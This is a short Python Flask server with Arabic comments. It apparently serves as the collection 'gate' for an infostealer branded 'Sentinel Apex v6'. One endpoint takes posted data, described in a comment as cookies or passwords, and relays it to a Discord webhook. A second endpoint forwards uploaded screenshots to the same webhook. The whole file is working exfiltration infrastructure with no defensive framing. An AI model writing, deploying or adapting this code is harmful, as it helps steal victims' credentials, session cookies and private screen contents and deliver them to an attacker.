import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# استبدل الرابط أدناه برابط Webhook الخاص بقناتك في ديسكورد
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK')

@app.route('/gate', methods=['POST'])
def gate():
    try:
        data = request.json
        # إرسال البيانات النصية (مثل الكوكيز أو الباسوردات)
        payload = {
            "username": "Sentinel Apex v6",
            "content": f"🚀 **تحديث جديد:**\n{data.get('content', 'لا يوجد محتوى')}"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/gate/screenshot', methods=['POST'])
def gate_screenshot():
    if 'file' in request.files:
        file = request.files['file']
        # إرسال الصورة مباشرة إلى ديسكورد
        files = {'file': (file.filename, file.stream, file.mimetype)}
        requests.post(DISCORD_WEBHOOK_URL, files=files)
        return "Screenshot Forwarded", 200
    return "No file", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
